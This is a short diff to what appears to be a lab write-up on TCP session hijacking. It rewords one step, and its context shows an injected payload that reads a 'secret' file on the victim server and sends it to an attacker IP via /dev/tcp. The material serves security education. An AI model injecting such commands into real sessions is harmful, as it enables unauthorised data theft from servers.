@@ -71,7 +71,7 @@ tcp_payload = "\rcat /home/seed/secret > /dev/tcp/10.0.2.6/9090\r"
 - after pressing enter:
 ![alt text](lab-tcp-hijack-after-enter.png "Lab tcp hijacking attack after enter command")
 
-7. once the attacker pressed enter to execute the above *netwox 40* command, if the attack is successful, the victim server's secret file will be displayed in the attacker's terminal window:
+7. once the attacker pressed enter to execute the above script, if the attack is successful, the victim server's secret file will be displayed in the attacker's terminal window:
 
 ![alt text](lab-tcp-hijack-success.png "Lab tcp session hijacking attack successful")
 
